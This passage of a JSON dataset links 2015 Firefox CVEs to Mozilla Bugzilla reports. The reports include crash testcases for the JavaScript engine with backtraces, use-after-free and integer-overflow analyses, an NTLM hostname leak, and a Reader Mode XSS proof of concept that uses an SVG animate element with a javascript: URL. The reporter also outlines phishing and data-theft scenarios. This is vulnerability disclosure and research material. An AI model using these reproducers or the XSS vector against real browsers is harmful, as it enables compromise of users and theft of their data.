js::jit::DoCallFallback (cx=0x7ffff6907000, frame=0x7fffffffb468, stub_=<optimized out>, argc=<optimized out>, vp=0x7fffffffb418, res=...) at js/src/jit/BaselineIC.cpp:8899 #31 0x00007ffff7feef9f in ?? () [...] #53 0x0000000000000000 in ?? () rax 0x0 0 rbx 0x7ffff69a5c00 140737330699264 rcx 0x7ffff6ca53b0 140737333842864 rdx 0x0 0 rsi 0x7ffff6f7a9d0 140737336814032 rdi 0x7ffff6f791c0 140737336807872 rbp 0x7fffffff89d0 140737488325072 rsp 0x7fffffff89d0 140737488325072 r8 0x7ffff7fe0780 140737354008448 r9 0x6372732f736a2f6c 7165916604736876396 r10 0x7fffffff8790 140737488324496 r11 0x7ffff6c27960 140737333328224 r12 0x7fffffff8f60 140737488326496 r13 0x0 0 r14 0x0 0 r15 0x0 0 rip 0x45d922 <JSObject::as<js::SharedTypedArrayObject>() const+28> => 0x45d922 <JSObject::as<js::SharedTypedArrayObject>() const+28>: movl $0x229,0x0 0x45d92d <JSObject::as<js::SharedTypedArrayObject>() const+39>: callq 0x4982c0 <abort()> Marked s-s because this assertion is known to be associated with security problems."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1209471",
        "title": "Assertion failure: MIR instruction returned object with unexpected type, at js/src/jit/MacroAssembler.cpp:1531",
        "description": "The following testcase crashes on mozilla-central revision 79a5b2968d01 (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --enable-debug, run with --fuzzing-safe --thread-count=2 --ion-extra-checks): function foo() { Object.prototype[2] = 2; delete Object.prototype[2]; for (var i = 9; i < 10; i & 1970 & Function ^ (this) ^ (this)) assertEq([2].concat([3])[0], 2); } foo(); Backtrace: Program received signal SIGTRAP, Trace/breakpoint trap. 0x00007ffff7fd1a4e in ?? () #0 0x00007ffff7fd1a4e in ?? () #1 0x00007fffffffc570 in ?? () #2 0xfff9000000000000 in ?? () #3 0xfff8800000000002 in ?? () #4 0xfff8800000000002 in ?? () #5 0x0000000000000000 in ?? () rax 0x7ffff4800000 140737295417344 rbx 0x7ffff48fffa0 140737296465824 rcx 0x7ffff7e5c6d0 140737352419024 rdx 0x7fffffffccd0 140737488342224 rsi 0x7ffff6907400 140737330050048 rdi 0x7fffffffc798 140737488340888 rbp 0x7fffffffc868 140737488341096 rsp 0x7fffffffc828 140737488341032 r8 0x1 1 r9 0x7ffff6907420 140737330050080 r10 0x7fffffffc580 140737488340352 r11 0x7ffff6c27960 140737333328224 r12 0x8 8 r13 0x7ffff47fc0b0 140737295401136 r14 0x7ffff7e610c0 140737352437952 r15 0x0 0 rip 0x7ffff7fd1a4e 140737353947726 => 0x7ffff7fd1a4e: push %r10 0x7ffff7fd1a50: push %r9 Marking s-s because this assertion is known to be security-related."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1107011",
        "title": "Crash in js::jit::LiveInterval::addRangeAtHead",
        "description": "I've gotten a bunch of crashes recently in js::jit::LiveInterval::addRangeAtHead. Some incident IDs: https://crash-stats.mozilla.com/report/index/bp-c1a67bdb-860e-462d-a4f3-36e082141130 https://crash-stats.mozilla.com/report/index/bp-a19d5109-b548-4601-9e12-8cf772141130 https://crash-stats.mozilla.com/report/index/bp-f3edc6f9-14d1-47d2-8beb-941842141203 https://crash-stats.mozilla.com/report/index/bp-0f4bf5de-5438-4080-8eac-965c42141203 I _think_ the last two of those were on http://theconversation.com/the-rape-scene-in-brad-pitts-fury-no-one-is-talking-about-33638 when scrolling down the page. All of these look like null derefs to me (crash at address 0x20)."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204669",
        "title": "nsXBLService::GetBinding is still crashing",
        "description": "See https://bugzilla.mozilla.org/show_bug.cgi?id=1202844#c18"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204700",
        "title": "Assertion failure: !has(reg), at jit/RegisterSets.h",
        "description": "var x = []; var y = []; for (var i = 0; i < 3; i++) { y.push(x); } asserts js 32-bit debug ARM-simulator shell on m-c changeset fba4b0cd3823 with --fuzzing-safe --no-threads --ion-eager --unboxed-arrays at Assertion failure: !has(reg), at jit/RegisterSets.h Configure options: LD=ld CROSS_COMPILE=1 CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" RANLIB=ranlib CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" AS=$CC AR=ar STRIP=\"strip -x -S\" HOST_CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse\" AUTOCONF=/usr/local/Cellar/autoconf213/2.13/bin/autoconf213 HOST_CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse\" sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=i386-apple-darwin9.2.0 --enable-macos-target=10.5 --enable-arm-simulator --enable-simulator=arm --enable-debug --enable-nspr-build --enable-more-deterministic --with-ccache --enable-gczeal --enable-debug-symbols --disable-tests python -u ~/funfuzz/js/compileShell.py -b \"--32 --enable-debug --enable-nspr-build --enable-more-deterministic --enable-simulator=arm\" -r fba4b0cd3823 autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: https://hg.mozilla.org/mozilla-central/rev/8b68a9f000b3 user: Nicolas B. Pierron date: Wed Aug 26 20:48:05 2015 +0200 summary: Bug 1190446 - Update Coverage information in Baseline. r=jandem Nicolas, is bug 1190446 a likely regressor?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1206564",
        "title": "crash from spinning event loop during resize paint",
        "description": "+++ This bug was initially created as a clone of Bug #726483 +++ 1. load testcase reported in bug 626963 comment 58 2. resize window 3. close window (with the window manager close button) This bug is about fixing the uaf reported in https://bugzilla.mozilla.org/show_bug.cgi?id=726483#c9 The fix here is not a complete solution to bug 726483."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1193038",
        "title": "UAF in Telemetry::Accumulate(); code appears to not be thread-safe",
        "description": "Repeated crashes in the field with 0x5a signatures. Called from Telemetry::Accumulate(Telemetry::DNS_FAILED_LOOKUP_TIME, millis); https://crash-stats.mozilla.com/report/index/aabb2399-64d7-4ec7-a888-027b02150805 There is no obvious mention anywhere in the Telemetry code/includes about the thread-safety aspects; thus one should presume it's callable from any thread (and in this case is, from a DNS resolver thread, STS thread, etc). However, I see no locking around access to shared telemetry structures, which presumably led to this set of crashes. I would imagine it's also prone to TSAN issues. The only good thing is that few of the crashes are on Release since most telemetry is disabled on Release (IIRC). But not all.... Others include Telemetry::Accumulate(Telemetry::STS_NUMBER_OF_ONSOCKETREADY_CALLS, numberOfOnSocketReadyCalls) (https://crash-stats.mozilla.com/report/index/c77f5b7c-cc39-44d3-9664-030ff2150807) More crashes, all ugly: https://crash-stats.mozilla.com/report/list?product=Firefox&signature=mozilla%3A%3ATelemetry%3A%3AAccumulate%28mozilla%3A%3ATelemetry%3A%3AID%2C+unsigned+int%29"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1191942",
        "title": "crash in nsCOMPtr<T>::nsCOMPtr<T>(nsIVariant*) | nsTArray_Impl<T>::AppendElement<T>(nsIDocument*&)",
        "description": "This bug was filed from the Socorro interface and is report bp-a2ad264a-47f7-41fc-8c09-e6db22150803. ============================================================= The signature changes a lot thanks to COMDAT folding, but as far as I can tell this stack with the refresh driver is seen on all current trains. A good number of these are at address 0x5a5a5a5e, and another chunk are at 0x4 -- either way it's an AddRef through a busted vtable. At first glance it looks like one of these FrameRequestCallbacks has been freed. Frame Module Signature Source 0 xul.dll nsCOMPtr<nsIVariant>::nsCOMPtr<nsIVariant>(nsIVariant*) xpcom/glue/nsCOMPtr.h 1 xul.dll nsTArray_Impl<DocumentFrameCallbacks, nsTArrayInfallibleAllocator>::AppendElement<nsIDocument*&>(nsIDocument*&) xpcom/glue/nsTArray.h 2 xul.dll TakeFrameRequestCallbacksFrom layout/base/nsRefreshDriver.cpp 3 xul.dll nsRefreshDriver::RunFrameRequestCallbacks(__int64, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp 4 xul.dll nsRefreshDriver::Tick(__int64, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp 5 xul.dll mozilla::RefreshDriverTimer::TickDriver(nsRefreshDriver*, __int64, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp 6 xul.dll mozilla::InactiveRefreshDriverTimer::TickOne() layout/base/nsRefreshDriver.cpp 7 xul.dll mozilla::InactiveRefreshDriverTimer::TimerTickOne(nsITimer*, void*) layout/base/nsRefreshDriver.cpp"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1208665",
        "title": "TempAllocPolicy::pod_* suffer from integer overflow issues",
        "description": "For example: template <typename T> T* pod_malloc(size_t numElems) { T* p = js_pod_malloc<T>(numElems); if (MOZ_UNLIKELY(!p)) p = static_cast<T*>(onOutOfMemory(AllocFunction::Malloc, numElems * sizeof(T))); return p; } js_pod_malloc does just fine with integer overflow, returning nullptr in that case. But then we call the onOutOfMemory function, passing in a multiplication that may well have overflowed. And that function ultimately delegates to this: JS_FRIEND_API(void*) JSRuntime::onOutOfMemory(AllocFunction allocFunc, size_t nbytes, void* reallocPtr, JSContext* maybecx) { MOZ_ASSERT_IF(allocFunc != AllocFunction::Realloc, !reallocPtr); if (isHeapBusy()) return nullptr; if (!oom::IsSimulatedOOMAllocation()) { /* * Retry when we are done with the background sweeping and have stopped * all the allocations and released the empty GC chunks. */ gc.onOutOfMallocMemory(); void* p; switch (allocFunc) { case AllocFunction::Malloc: p = js_malloc(nbytes); break; ... } if (p) return p; } So something like this: typedef struct { uint32_t arr[1024]; } Bunch; TempAllocPolicy talloc(cx); Bunch* b = talloc.pod_malloc<Bunch>(2 * 1048576); if (!b) return false; for (size_t i = 0; i < 2 * 1048576; i++) b[i].arr[1023] = 17; would result in JSRuntime::onOutOfMemory being called (on a 32-bit system) with nbytes=0, and so the above loop would write beyond the (0-byte, probably 4-byte under the hood) allocation that backs far, far less than the entirety of |b|. This is obviously bad, but I don't know if it's used in a place that doesn't have its *own* integer overflow detection. Vector has its own, and Vector is probably one of the bigger users of this. But it seems a fool's errand to try to check every caller, so I think we should assume the worst and fix this. I found this while investigating bug 1207519, for what it's worth. We probably should audit all the other AllocPolicy implementations and ensure none of them have a similar problem, too, while we're at it."
      }
    ],
    "CVE-2015-4514": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1185157",
        "title": "Assertion failures in accessibility IPC",
        "description": "This is a fairly common IPC assertion crash on Nightly. We're inside mozilla::layout::PVsyncChild::OnMessageReceived(), which calls nsRefreshDriver::Tick(), which calls mozilla::a11y::NotificationController::WillRefresh(), which then calls mozilla::a11y::PDocAccessibleChild::SendTextChangeEvent() or SendHideEvent(), which tries to send a message. This is on the main thread in the content process. I'm not sure if the issue is the nested IPC or whether a11y IPC is supposed to run no another thread or what. Here are some example crash reports: https://crash-stats.mozilla.com/report/index/9aef00e4-cefb-476a-8cc3-525fd2150717 https://crash-stats.mozilla.com/report/index/74205d66-570b-49bf-84a0-8a9a72150717 https://crash-stats.mozilla.com/report/index/46415e7d-cede-4614-a630-d34b02150716 https://crash-stats.mozilla.com/report/index/30a44a30-bb8b-479f-89c1-f05bf2150716"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=969309",
        "title": "Assertion failure: masm.currentOffset() - lastOsiPointOffset_ >= Assembler::patchWrite_NearCallSize(), at jit/shared/CodeGenerator-shared.cpp:423",
        "description": "The attached testcase asserts on mozilla-central revision f550b112a19b (x86 ARM simulator build, run with --fuzzing-safe --ion-eager)."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1202677",
        "title": "Hit MOZ_CRASH(css::ImageValue not thread-safe) at c:/Users/mozilla/debug-builds/ mozilla-central/layout/style/nsCSSValue.cpp:2475",
        "description": "Found by Bughunter Hit MOZ_CRASH(css::ImageValue not thread-safe) at c:/Users/mozilla/debug-builds/ mozilla-central/layout/style/nsCSSValue.cpp:2475 ### ERROR: CreateThread: Access is denied. Steps to reproduce: --> Load http://www.musepen.com/blog/adobe-muse-hover-rolling-push-widget/ --> Hit MOZ_CRASH(css::ImageValue not thread-safe) at c:/Users/mozilla/debug-builds/ mozilla-central/layout/style/nsCSSValue.cpp:2475 ### ERROR: CreateThread: Access is denied."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1196237",
        "title": "nsHostResolver thread is still running late in shutdown",
        "description": "This is per bug 1193038, comment 0 and bug 1193038, comment 6 ff. (In reply to Randell Jesup [:jesup] from comment #0) > Repeated crashes in the field with 0x5a signatures. > Called from > Telemetry::Accumulate(Telemetry::DNS_FAILED_LOOKUP_TIME, millis); > > https://crash-stats.mozilla.com/report/index/aabb2399-64d7-4ec7-a888- > 027b02150805 The follow-up comments there make it pretty clear that nsHostResolver is still running late (after the backing Telemetry storage is already cleared out). > Others include > Telemetry::Accumulate(Telemetry::STS_NUMBER_OF_ONSOCKETREADY_CALLS, > numberOfOnSocketReadyCalls) > (https://crash-stats.mozilla.com/report/index/c77f5b7c-cc39-44d3-9664- > 030ff2150807) Per that nsSocketTransportService might have a similar issue."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1200326",
        "title": "Assertion failure: false [@mozilla::MP4TrackDemuxer::MP4TrackDemuxer]",
        "description": "Assertion failure: false, at /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/src/dom/media/fmp4/MP4Demuxer.cpp:206"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1205937",
        "title": "Crash [@ js::gc::IsInsideNursery(js::gc::Cell const*)]",
        "description": "The following testcase crashes on mozilla-central revision e7d613b3bcfe (build with --enable-gczeal --enable-optimize=\"-O2 -g\" --enable-address-sanitizer --enable-posix-nspr-emulation --disable-jemalloc --disable-tests --disable-debug, run with --fuzzing-safe --thread-count=2 --ion-extra-checks --ion-eager): gczeal(7,1); eval(` var otherGlobalSameCompartment = newGlobal(\"same-compartment\"); eval = otherGlobalSameCompartment.eval; `); loadFile(` /** Yes, I'm a multi-line comment spanning 18 lines. Don't you dare to make me smaller or larger... */ new TestCase( SECTION, \"MakeDate(Number.POSITIVE_INFINITY, 0)\", Number.NaN, MakeDate(Number.POSITIVE_INFINITY, 0) ); new TestCase( SECTION, \"MakeDate(Number.NEGATIVE_INFINITY, 0)\", Number.NaN, NaN[MakeDate+4] ); new TestCase( SECTION, \"MakeDate(0, Number.POSITIVE_INFINITY)\", Number.target , MakeDate(0, Number.POSITIVE_INFINITY) ); new TestCase( SECTION, \"MakeDate(0, Number.NEGATIVE_INFINITY)\", Number.NaN, MakeDate(0, ( (yield ) , SECTION ? (yield ) : (yield ) , (yield ) ) .NEGATIVE_INFINITY) ); test(); `); function loadFile(lfVarx) { eval(\"(function() { \" + lfVarx + \" })();\"); } Backtrace: ==65394==ERROR: AddressSanitizer: SEGV on unknown address 0x7fff000fffe8 (pc 0x000000dbe2f9 sp 0x7fffb39d1540 bp 0x7fffb39d1630 T0) #0 0xdbe2f8 in js::gc::IsInsideNursery(js::gc::Cell const*) js/src/opt64asan/js/src/../../dist/include/js/HeapAPI.h:312 #1 0xdbe2f8 in void js::TenuringTracer::traverse<JSObject*>(JSObject**) js/src/gc/Marking.cpp:1888 #2 0xdbe2f8 in void js::TenuringTracer::traverse<JS::Value>(JS::Value*) js/src/gc/Marking.cpp:1900 #3 0xdbe2f8 in void DispatchToTracer<JS::Value>(JSTracer*, JS::Value*, char const*) js/src/gc/Marking.cpp:602 #4 0xea31e5 in js::jit::BaselineFrame::trace(JSTracer*, js::jit::JitFrameIterator&) js/src/jit/BaselineFrame.cpp:53 #5 0x11d0996 in js::jit::MarkJitActivation(JSTracer*, js::jit::JitActivationIterator const&) js/src/jit/JitFrames.cpp:1546 #6 0x11d0996 in js::jit::MarkJitActivations(JSRuntime*, JSTracer*) js/src/jit/JitFrames.cpp:1581 #7 0xd4d9e5 in js::gc::GCRuntime::markRuntime(JSTracer*, js::gc::GCRuntime::TraceOrMarkRuntime) js/src/gc/RootMarking.cpp:332 #8 0xd48366 in js::Nursery::collect(JSRuntime*, JS::gcreason::Reason, js::Vector<js::ObjectGroup*, 0ul, js::SystemAllocPolicy>*) js/src/gc/Nursery.cpp:460 #9 0x175214d in js::gc::GCRuntime::minorGCImpl(JS::gcreason::Reason, js::Vector<js::ObjectGroup*, 0ul, js::SystemAllocPolicy>*) js/src/jsgc.cpp:6502 #10 0x175214d in js::gc::GCRuntime::minorGC(JS::gcreason::Reason) js/src/gc/GCRuntime.h:606 #11 0x16aca64 in js::gc::GCRuntime::runDebugGC() js/src/jsgc.cpp:6725 #12 0x8e692f in js::gc::GCRuntime::gcIfNeededPerAllocation(JSContext*) js/src/gc/Allocator.cpp:28 #13 0x90e9b6 in JSContext::runtime() const js/src/gc/Allocator.cpp:55 #14 0x90e9b6 in js::BaseShape* js::Allocate<js::BaseShape, (js::AllowGC)1>(js::ExclusiveContext*) js/src/gc/Allocator.cpp:211 #15 0xb6e66a in js::BaseShape::getUnowned(js::ExclusiveContext*, js::StackBaseShape&) js/src/vm/Shape.cpp:1262 #16 0xb724bb in js::EmptyShape::getInitialShape(js::ExclusiveContext*, js::Class const*, js::TaggedProto, unsigned long, unsigned int) js/src/vm/Shape.cpp:1502 #17 0x16d22e5 in NewObject(js::ExclusiveContext*, JS::Handle<js::ObjectGroup*>, js::gc::AllocKind, js::NewObjectKind, unsigned int) js/src/jsobj.cpp:678 #18 0x16d1ad4 in js::NewObjectWithGivenTaggedProto(js::ExclusiveContext*, js::Class const*, JS::Handle<js::TaggedProto>, js::gc::AllocKind, js::NewObjectKind, unsigned int) js/src/jsobj.cpp:745:29 #19 0x9a846d in js::NewObjectWithGivenTaggedProto(js::ExclusiveContext*, js::Class const*, JS::Handle<js::TaggedProto>, js::NewObjectKind, unsigned int) js/src/jsobjinlines.h:641 #20 0x9a846d in js::NewObjectWithGivenProto(js::ExclusiveContext*, js::Class const*, JS::Handle<JSObject*>, js::NewObjectKind) js/src/jsobjinlines.h:676 #21 0x9a846d in js::NewNativeObjectWithGivenProto(js::ExclusiveContext*, js::Class const*, JS::Handle<JSObject*>, js::NewObjectKind) js/src/vm/NativeObject-inl.h:337 #22 0x9a846d in CreateBlankProto(JSContext*, js::Class const*, JS::Handle<JSObject*>, JS::Handle<JSObject*>) js/src/vm/GlobalObject.cpp:472 #23 0x93a286 in js::GlobalObject::createBlankPrototype(JSContext*, js::Class const*) js/src/vm/GlobalObject.cpp:488 #24 0x16c0170 in js::GlobalObject::initIteratorClasses(JSContext*, JS::Handle<js::GlobalObject*>) js/src/jsiter.cpp:1383 #25 0x16c16ba in js::InitIteratorClasses(JSContext*, JS::Handle<JSObject*>) js/src/jsiter.cpp:1453 #26 0x9a4dd2 in js::GlobalObject::resolveConstructor(JSContext*, JS::Handle<js::GlobalObject*>, JSProtoKey) js/src/vm/GlobalObject.cpp:133 #27 0x99e890 in js::GlobalObject::ensureConstructor(JSContext*, JS::Handle<js::GlobalObject*>, JSProtoKey) js/src/vm/GlobalObject.cpp:100 #28 0x99e890 in js::GlobalObject::getOrCreateLegacyGeneratorObjectPrototype(JSContext*, JS::Handle<js::GlobalObject*>) js/src/vm/GlobalObject.h:555 #29 0x99e890 in js::GeneratorObject::create(JSContext*, js::AbstractFramePtr) js/src/vm/GeneratorObject.cpp:41 AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV js/src/opt64asan/js/src/../../dist/include/js/HeapAPI.h:312 js::gc::IsInsideNursery(js::gc::Cell const*) ==65394==ABORTING Honestly I have no clue what's going on here. This test crashes only in 64 bit ASan builds, not in any other build type I tried. It also only crashes when the exact number of line breaks is preserved in that second template string."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1186160",
        "title": "WebSocketChannel accesses nsDocShell and nsDocument off the main thread",
        "description": "Tracy pointed out that NS_CycleCollectorSuspect3 is the number #21 crash on Firefox 40 beta. I looked at a dozen of the crash reports and they all have stacks like this: NS_CycleCollectorSuspect3 nsHTMLDocument::AddRef() nsCOMPtr<nsNavHistoryQueryOptions>::nsCOMPtr<nsNavHistoryQueryOptions>(nsNavHistoryQueryOptions*) nsDocShell::ShouldPrepareForIntercept(nsIURI*, bool, bool*) mozilla::net::HttpBaseChannel::ShouldIntercept() mozilla::net::nsHttpChannel::AsyncOpen(nsIStreamListener*, nsISupports*) mozilla::net::WebSocketChannel::BeginOpenInternal() mozilla::net::WebSocketChannel::BeginOpen(bool) mozilla::net::WebSocketChannel::Notify(nsITimer*) This is off the main thread. Some reports: https://crash-stats.mozilla.com/report/index/9ebb3224-6e42-40b2-887a-beea82150717 https://crash-stats.mozilla.com/report/index/727f35a4-122a-4f32-8582-1d8152150718 https://crash-stats.mozilla.com/report/index/ea6c598d-0794-483b-a6a2-deb252150716 https://crash-stats.mozilla.com/report/index/68840357-f4b8-4400-a1bc-afc342150717"
      }
    ],
    "CVE-2015-4515": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1046421",
        "title": "Information disclosure vulnerability in Firefox via NTLM based HTTP authentication feature",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 Steps to reproduce: I have no idea how seriously this bug will be treated however Firefox/Chrome (Multiplatform) along with Safari (OS X/iOS), Web Browser (BlackBerry) and IE (Windows) disclose the hostname and (in some cases the Windows domain) via NTLM based HTTP authentication when sending type 3 messages as part of the authentication exchange. NB: I've only approached Google so far, some help with co-ordination might be required, if it is deemed worth fixing. An example URL to a web server capable of triggering this flaw can be made available on request, however I believe the bug is simple enough that it can easily be spotted in the source. I'm guessing populate that Firefox simply populates the Workstation field with the hostname of the system. By comparison, the original KHTML source tree is not affected (since that uses the hardcoded \"WORKSTATION\" value). Actual results: This can allow users to be tracked across the Internet. Some observations: * The exploit can be triggered silently * The exploit works irrespective of whether JavaScript is enabled * The exploit works even in privacy mode * The exploit can be triggered even if the user is behind a firewall and/or proxy * The exploit can be utilised to aid in unmasking VPN and/or TOR users Expected results: Type 3 messages sent by Firefox should not disclose the users real hostname and/or Windows domain."
      }
    ],
    "CVE-2015-4517": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1168959",
        "title": "Memory-safety bugs in NetworkUtils.cpp generally",
        "description": "User Agent: Mozilla/5.0 (Windows; rv:***) Gecko/20100101 Firefox/**.* Build ID: 20150305021524 Steps to reproduce: 38.0.1\\dom\\system\\gonk\\NetworkUtils.cpp has several memory-safety bugs resulting from the use of snprintf. The problem is that it assumes that snprintf always null-terminates the stack-based destination string. This is not, however, guaranteed unless the result string length is < the specified character count, and, of course, automatic variables are generally uninitialized, so the result string won't be null-terminated by default. There are 3 good examples of this bug in NetworkUtils::setAccessPoint, and several others throughout the module. If any of the strings used as input to snprintf are under external control, this bug could cause the disclosure of sensitive information and/or allow an attacker to corrupt Firefox's address space and/or send attacker-designated network commands and/or allow execution of attacker-chosen code."
      }
    ],
    "CVE-2015-4518": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1136692",
        "title": "Reader Mode does not completely disable all active content (XSS)",
        "description": "STR 1) Open attachment 2 [review]) click on reader mode button 3) click on the black rectangle 4) XSS I think this *may* be a bug in ParserUtils or in how they are used, but I did not have the time to look into this properly. Will update if I make any additional findings."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1182778",
        "title": "Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0 Build ID: 20150629114848 Steps to reproduce: Firefox offers a special mode for websites supposedly containing articles and text-heavy content that is called the \"Reader View\" (RV). This RV mode removes any potentially disturbing content from a website and attempts to show only the relevant details such as article headlines, article images and article body. RV removes the ability to execute scripts (similarly to the RV offered by MS's Edge Browser). It does so by imposing a white-list on HTML content and stripping all that is not considered harmless. this includes script elements, JavaScript URIs, event handlers and more. The RV is being deployed from a special scope, about:reader. A URL of a website opened in RV will be \"about:reader?url=`escape(%website-url%)`\". While the URL is deployed from the about:reader scheme, the address bar hides that scheme prefix and shows the original page URL. My tests have shown, that this white-list is too permissive and allows for elements to pass, even though they can execute JavaScript. Here is the full test case I was using (PHP file - for CSP headers' sake): <?php header('Content-Security-Policy: default-src \\'self\\' '); ?><html> <head> </head> <body> <h1>Some Article</h1> <article> <h2>Some headline</h2> <p> <svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"> <a xlink:href> <circle r=\"999\"></circle> <animate attributeName=\"xlink:href\" from=\"javascript:alert(location)\" to></animate> </a> </svg> Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? </p> <p> Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? </p> </article> </body> </html> Once we load this URL from any web-origin, let's say http://example.com/test.php, the Firefox browser will show a small icon in the address bar, allowing a user to change into the RV. Once the RV is loaded, the page is shown with the customized minimal markup. Now, the interesting part is, that a certain dangerous part of the HTML from our test case above is not being removed: <svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"> <a xlink:href> <circle r=\"999\"></circle> <animate attributeName=\"xlink:href\" from=\"javascript:alert(location)\" to></animate> </a> </svg> What is shown with this test-case is a large black box (a clip of the SVG circle). Clicking this box will trigger an alert window, executing from about:reader. Note that this happens despite CSP headers being used on the original page. Further note that for example NoScript needs to white-list about:reader for the RV to be used at all. Once that is the case, NoScript does not prevent the script execution any much longer. This is not optimal and might require changes in both FF and NoScript to function as expected (e.g. allowing NoScript to apply the domain-trust to pages even when loaded in RV). I was thinking about possible exploitation of this seemingly unwanted behaviour. And I think it can be exploited. let's assume the following scenario: * An attacker injects the malicious SVG on a website * The website uses CSP, users of modern browsers are not affected by the injection * A user now decides to use RV and watches the injected page * All of a sudden, the payload does work despite CSP * Naturally, we have no true XSS here but the attacker can still do a lot > Use document.write to eliminate all UI elements of RV > Fill the page with arbitrary other content, like a forged login form / other phishing frenzy The core problem here is, that, even though the page in RV is deployed from about:reader, the user cannot distinguish between RV being active or not. The attacker can influence the entirety of HTML and write whatever into the page body, while the address bar is still showing the original URL without the about:reader prefix. Despite the domain using CSP, the attacker can phish with JavaScript and exfiltrate any data the user emits. And NoScript doesn't seem to help here. To fix the issue, I'd recommend several things: * Fix the white-list and eliminate SVG's animate and set * Provide a better domain-based distinction for NoScript to work as expected * Optimize the info shown in the address bar to avoid spoofing attacks * Don't lose security headers on the way. CSP in regular mode should also work in RV Actual results: see above Expected results: see above"
      }
    ],
    "CVE-2015-4519": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1189814",
        "title": "Dragging and dropping image to <textbox> pastes final URL of image after redirects",
        "description": "https://fetch.spec.whatwg.org/#atomic-http-redirect-handling says: \"Throughout the platform, redirects (a response whose status is one of 301, 302, 303, 307, and 308) are not exposed to APIs. Exposing redirects might leak information not otherwise available through a cross-site scripting attack.\" However, if you have: <img src=\"http://foo.com/\"> and that URL redirects to \"http://bar.com?secret=12345\", and then that loads the image, and then if you drag-drop the image to a textbox, the final URL is dropped (and therefore then available to script) rather than the initial URL. This has been combined with cookie bombing to make a POC to steal Bugzilla secure attachments - see bug 1179241. I talked with Anne VK and he said that whatever we do about cookie bombing, this is also a bug. Gerv"
      }
    ],
    "CVE-2015-4521": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1170246",
        "title": "Memory-safety bugs in ConvertDialogOptions",
